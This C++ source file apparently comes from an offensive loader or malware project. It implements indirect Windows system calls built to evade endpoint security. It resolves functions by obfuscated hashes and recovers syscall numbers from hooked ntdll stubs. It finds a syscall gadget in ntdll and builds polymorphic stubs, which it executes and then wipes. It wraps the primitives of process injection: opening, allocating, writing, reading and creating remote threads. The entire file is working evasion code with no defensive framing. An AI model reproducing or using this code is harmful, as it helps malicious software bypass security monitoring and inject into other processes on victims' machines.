#include "Syscalls.h"
#include "Resolver.h"
#include "Obfuscation.h"
#include "Internal.h"
#include <thread>
#include <chrono>
#include <mutex>
namespace Syscalls {
    static std::mutex g_syscallMutex;
    WORD GetSSN(const std::string& funcName) {
        auto ntdllObj = OBFS_S("ntdll.dll");
        LPVOID pFunc = Resolver::GetAPIByHash(
            Resolver::HashString(ntdllObj.c_str()) ^ Resolver::g_runtimeXorKey,
            Resolver::HashString(funcName.c_str()) ^ Resolver::g_runtimeXorKey);
        if (!pFunc) {
            SYSCALL_LOG("Resolve failed for " + funcName, 0, 0);
            return 0;
        }
        unsigned char* bytes = (unsigned char*)pFunc;
#ifdef _WIN64
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8) {
            return *(WORD*)(bytes + 4);
        }
        if (bytes[3] == 0xB8 && bytes[6] == 0x00 && bytes[7] == 0x00) {
            return *(WORD*)(bytes + 4);
        }
        if ((bytes[0] == 0xE9 || bytes[0] == 0xCC || bytes[0] == 0xEB) &&
            bytes[3] == 0xB8 && bytes[6] == 0x00 && bytes[7] == 0x00) {
            WORD candidate = *(WORD*)(bytes + 4);
            if (candidate < 0x1000) {
                SYSCALL_LOG("Hooked (short jmp) " + funcName, candidate, 0);
                return candidate;
            }
        }
        if (bytes[0] == 0xFF && bytes[1] == 0x25) {
            if (bytes[6] == 0x4C && bytes[7] == 0x8B && bytes[8] == 0xD1 && bytes[9] == 0xB8) {
                WORD candidate = *(WORD*)(bytes + 10);
                if (candidate < 0x1000) {
                    SYSCALL_LOG("Hooked (jmp [rip]) " + funcName, candidate, 0);
                    return candidate;
                }
            }
        }
        for (WORD i = 1; i < 500; i++) {
            unsigned char* down = bytes + (i * 0x20);
            if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
                return *(WORD*)(down + 4) - i;
            }
            if (down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
                return *(WORD*)(down + 4) - i;
            }
            if ((down[0] == 0xE9 || down[0] == 0xCC) &&
                down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
                WORD candidate = *(WORD*)(down + 4) - i;
                if (candidate < 0x1000) return candidate;
            }
            unsigned char* up = bytes - (i * 0x20);
            if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
                return *(WORD*)(up + 4) + i;
            }
            if (up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
                return *(WORD*)(up + 4) + i;
            }
            if ((up[0] == 0xE9 || up[0] == 0xCC) &&
                up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
                WORD candidate = *(WORD*)(up + 4) + i;
                if (candidate < 0x1000) return candidate;
            }
        }
#else
        if (bytes[0] == 0xB8) {
            return *(WORD*)(bytes + 1);
        }
        if (bytes[3] == 0x00 && bytes[4] == 0x00) {
            WORD candidate = *(WORD*)(bytes + 1);
            if (candidate < 0x1000) return candidate;
        }
        if ((bytes[0] == 0xE9 || bytes[0] == 0xCC) && bytes[5] == 0xB8) {
            WORD candidate = *(WORD*)(bytes + 6);
            if (candidate < 0x1000) return candidate;
        }
        for (WORD i = 1; i < 500; i++) {
            unsigned char* down = bytes + (i * 0x14);
            if (down[0] == 0xB8) return *(WORD*)(down + 1) - i;
            if ((down[0] == 0xE9 || down[0] == 0xCC) && down[5] == 0xB8) {
                WORD c = *(WORD*)(down + 6) - i;
                if (c < 0x1000) return c;
            }
            unsigned char* up = bytes - (i * 0x14);
            if (up[0] == 0xB8) return *(WORD*)(up + 1) + i;
            if ((up[0] == 0xE9 || up[0] == 0xCC) && up[5] == 0xB8) {
                WORD c = *(WORD*)(up + 6) + i;
                if (c < 0x1000) return c;
            }
        }
#endif
        SYSCALL_LOG("SSN not found for " + funcName, 0, 0);
        return 0;
    }
    LPVOID GetSyscallGadget() {
        static LPVOID pGadget = NULL;
        if (pGadget) return pGadget;
        auto ntdllObj = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllObj.c_str());
        if (!hNtdll) return NULL;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((size_t)hNtdll + dos->e_lfanew);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        auto textSec = OBFS_S(".text");
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (Internal::InlineStrEq((char*)section[i].Name, textSec.c_str())) {
                unsigned char* start = (unsigned char*)((size_t)hNtdll + section[i].VirtualAddress);
                DWORD size = section[i].Misc.VirtualSize;
                for (DWORD j = 0; j < size - 2; j++) {
#ifdef _WIN64
                    if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
#else
                    if (start[j] == 0x0F && start[j + 1] == 0x34 && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
                    if (start[j] == 0xCD && start[j + 1] == 0x2E && start[j + 2] == 0xC3) {
                        pGadget = (LPVOID)(start + j);
                        return pGadget;
                    }
#endif
                }
            }
        }
        return NULL;
    }
    static LPVOID GetStubBuffer() {
        static LPVOID pBuf = NULL;
        static HANDLE hSection = NULL;
        if (!pBuf) {
#ifndef FILE_MAP_EXECUTE
#define FILE_MAP_EXECUTE 0x0020
#endif
            if (Internal::_CreateFileMappingA && Internal::_MapViewOfFile) {
                hSection = Internal::_CreateFileMappingA(
                    INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
                    0, 0x1000, NULL);
                if (hSection) {
                    pBuf = Internal::_MapViewOfFile(hSection,
                        FILE_MAP_WRITE | FILE_MAP_READ | FILE_MAP_EXECUTE,
                        0, 0, 0x1000);
                }
            }
            if (!pBuf) {
                pBuf = Internal::_VirtualAlloc(NULL, 0x1000,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            }
        }
        return pBuf;
    }
    static void SecureWipeStub(LPVOID pExec, size_t len) {
#if POLY_SYSCALLS
        // Polymorphic wipe: overwrite with random noise (int3/nop/ret/random)
        Polymorph::RandomWipeStub(pExec, len);
#else
        volatile unsigned char* p = (volatile unsigned char*)pExec;
        for (size_t i = 0; i < len; i++) {
            p[i] = 0;
        }
#endif
    }
    static bool FlipStubProtection(LPVOID pExec, DWORD newProt) {
        DWORD oldProt = 0;
        return Internal::_VirtualProtect(pExec, POLY_STUB_MAX, newProt, &oldProt) != FALSE;
    }

#if POLY_SYSCALLS

    // Polymorphic: BUILD writes directly into pExec, COPY_AND_FLIP only flips
    #ifdef _WIN64
    #define BUILD_SYSCALL_STUB(ssnVal, gadgetPtr, stubName) \
        size_t stubName##_polyLen = Polymorph::BuildPolymorphicStub( \
            (unsigned char*)pExec, POLY_STUB_MAX, ssnVal, gadgetPtr);
    #else
    #define BUILD_SYSCALL_STUB_X86(ssnVal, gadgetPtr, stubName, retBytes) \
        size_t stubName##_polyLen = Polymorph::BuildPolymorphicStub( \
            (unsigned char*)pExec, POLY_STUB_MAX, ssnVal, gadgetPtr, retBytes);
    #endif

    #define SYSCALL_EXEC_COPY_AND_FLIP(stubName) \
        FlipStubProtection(pExec, PAGE_EXECUTE_READ);

    #define SYSCALL_EXEC_CLEANUP(stubName, resultVar) \
        FlipStubProtection(pExec, PAGE_READWRITE); \
        SecureWipeStub(pExec, stubName##_polyLen); \
        SYSCALL_LOG("", 0, resultVar);

#else

    // Original static stubs (debug / non-polymorphic builds)
    #ifdef _WIN64
    #define BUILD_SYSCALL_STUB(ssnVal, gadgetPtr, stubName) \
        unsigned char stubName[] = { \
            0x4C, 0x8B, 0xD1, \
            0xB8, (unsigned char)((ssnVal) & 0xFF), (unsigned char)(((ssnVal) >> 8) & 0xFF), 0x00, 0x00, \
            0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
            0x41, 0xFF, 0xE3 \
        }; \
        *(size_t*)(stubName + 10) = (size_t)(gadgetPtr);
    #else
    #define BUILD_SYSCALL_STUB_X86(ssnVal, gadgetPtr, stubName, retBytes) \
        unsigned char stubName[] = { \
            0xB8, (unsigned char)((ssnVal) & 0xFF), (unsigned char)(((ssnVal) >> 8) & 0xFF), 0x00, 0x00, \
            0xBA, 0x00, 0x00, 0x00, 0x00, \
            0xFF, 0xE2, \
            0xC2, (unsigned char)((retBytes) & 0xFF), (unsigned char)(((retBytes) >> 8) & 0xFF) \
        }; \
        *(size_t*)(stubName + 6) = (size_t)(gadgetPtr);
    #endif

    #define SYSCALL_EXEC_COPY_AND_FLIP(stubName) \
        memcpy(pExec, stubName, sizeof(stubName)); \
        FlipStubProtection(pExec, PAGE_EXECUTE_READ);

    #define SYSCALL_EXEC_CLEANUP(stubName, resultVar) \
        FlipStubProtection(pExec, PAGE_READWRITE); \
        SecureWipeStub(pExec, sizeof(stubName)); \
        SYSCALL_LOG("", 0, resultVar);

#endif // POLY_SYSCALLS

    #define SYSCALL_PREAMBLE(ntFuncName, ssnVar, gadgetVar) \
        static WORD ssnVar = GetSSN(OBFS_S(ntFuncName)); \
        static LPVOID gadgetVar = GetSyscallGadget(); \
        if (ssnVar == 0 || !gadgetVar) { \
            SYSCALL_LOG(ntFuncName " preamble fail", ssnVar, 0xC0000001); \
            return (NTSTATUS)0xC0000001; \
        }
    #define SYSCALL_EXEC_BEGIN() \
        std::lock_guard<std::mutex> lock(g_syscallMutex); \
        LPVOID pExec = GetStubBuffer(); \
        if (!pExec) return (NTSTATUS)0xC0000001;
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
    {
        SYSCALL_PREAMBLE("NtAllocateVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x18);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
    {
        SYSCALL_PREAMBLE("NtProtectVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
    {
        SYSCALL_PREAMBLE("NtWriteVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval) {
        SYSCALL_PREAMBLE("NtDelayExecution", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(BOOLEAN, LONGLONG*);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(BOOLEAN, LONGLONG*);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x08);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Alertable, DelayInterval);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG FreeType)
    {
        SYSCALL_PREAMBLE("NtFreeVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, RegionSize, FreeType);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtClose(HANDLE Handle) {
        SYSCALL_PREAMBLE("NtClose", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x04);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Handle);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle,
        ULONG ProcessInformationClass, PVOID ProcessInformation,
        ULONG ProcessInformationLength, PULONG ReturnLength)
    {
        SYSCALL_PREAMBLE("NtQueryInformationProcess", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle,
        ULONG ThreadInformationClass, PVOID ThreadInformation,
        ULONG ThreadInformationLength)
    {
        SYSCALL_PREAMBLE("NtSetInformationThread", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, ULONG, PVOID, ULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, ULONG, PVOID, ULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
        PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits,
        SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
    {
        SYSCALL_PREAMBLE("NtCreateThreadEx", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x2C);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    void SleepMs(DWORD milliseconds) {
        if (milliseconds == 0) return;
        LONGLONG delay = milliseconds * -10000LL;
        if (NtDelayExecution(FALSE, &delay) != 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));
        }
    }
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead)
    {
        SYSCALL_PREAMBLE("NtReadVirtualMemory", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x14);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId)
    {
        SYSCALL_PREAMBLE("NtOpenProcess", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass,
        PVOID SystemInformation, ULONG SystemInformationLength,
        PULONG ReturnLength)
    {
        SYSCALL_PREAMBLE("NtQuerySystemInformation", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
        PLARGE_INTEGER Timeout)
    {
        SYSCALL_PREAMBLE("NtWaitForSingleObject", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x0C);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Handle, Alertable, Timeout);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
}
